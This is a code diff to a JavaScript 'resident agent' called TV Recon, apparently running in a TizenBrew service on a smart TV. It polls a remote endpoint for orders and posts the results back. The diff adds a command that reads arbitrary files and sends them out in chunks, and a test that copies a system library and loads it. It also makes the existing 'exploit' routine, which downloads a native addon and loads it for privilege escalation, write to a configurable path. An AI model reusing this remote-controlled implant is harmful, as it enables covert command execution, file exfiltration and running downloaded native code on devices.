@@ -1,4 +1,4 @@
-/* TV Recon v9 — LONG-LIVED RESIDENT AGENT.
+/* TV Recon v10 — LONG-LIVED RESIDENT AGENT.
  * Runs in the TizenBrew service vm context. No crash markers, no throws —
  * a single resident module with a polling loop. Orders from /mode:
  *   {"action":"recon"}   light status posts
@@ -33,8 +33,8 @@ function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.messag
 function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
 function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }
 
-console.log('TV Recon v9 resident agent starting');
-post('v9-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
+console.log('TV Recon v10 resident agent starting');
+post('v10-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
 
 function getMode(cb) {
     try {
@@ -184,6 +184,32 @@ function doWritefile(mode) {
     } catch (e) { post('fetch-fail', String(e)); }
 }
 
+function doReadfile(mode) {
+    try {
+        var content = read(mode.path, mode.max || 60000);
+        var s = String(content);
+        var CH = 3500;
+        for (var i = 0; i < s.length; i += CH) {
+            post('readfile-out', { path: mode.path, i: i / CH, total: Math.ceil(s.length / CH), s: s.slice(i, i + CH) });
+        }
+        post('readfile-done', { path: mode.path, len: s.length });
+    } catch (e) { post('readfile-err', String(e)); }
+}
+
+function doDlopentest(mode) {
+    try {
+        var src = mode.lib || '/usr/lib/libc.so.6';
+        fs.copyFileSync(src, '/tmp/t.node');
+        post('dlopentest-copied', { lib: src, size: T(function () { return fs.statSync('/tmp/t.node').size; }) });
+        try {
+            var m = require('/tmp/t.node');
+            post('dlopentest-loaded', { keys: T(function () { return Object.keys(m); }) });
+        } catch (e2) {
+            post('dlopentest-err', String(e2));
+        }
+    } catch (e) { post('dlopentest-outer-err', String(e)); }
+}
+
 function doExploit(mode) {
     /* Choreographed escalation train, one boot:
      * 1. download N-API addon  2. require() it  3. read constructor marker
@@ -199,10 +225,11 @@ function doExploit(mode) {
             res.on('end', function () {
                 try {
                     var buf = Buffer.concat(chunks);
-                    fs.writeFileSync('/tmp/x.node', buf);
+                    var target = mode.path || '/tmp/x.node';
+                    fs.writeFileSync(target, buf);
                     post('exploit-addon-saved', { bytes: buf.length });
                     /* THE MOMENT: dlopen via require() */
-                    var addon = require('/tmp/x.node');
+                    var addon = require(target);
                     post('exploit-addon-loaded', { typeOf: typeof addon, keys: T(function () { return Object.keys(addon); }) });
                     /* constructor should have written the marker */
                     var marker = read('/tmp/.nativenow', 2000);
@@ -282,7 +309,9 @@ function tick() {
                     }
                 }
                 if (!alreadyRan) {
-                if (mode.action === 'exec') doExec(mode);
+                if (mode.action === 'readfile') doReadfile(mode);
+                else if (mode.action === 'dlopentest') doDlopentest(mode);
+                else if (mode.action === 'exec') doExec(mode);
                 else if (mode.action === 'spawn') doSpawn(mode);
                 else if (mode.action === 'writefile') doWritefile(mode);
                 else if (mode.action === 'exploit') doExploit(mode);
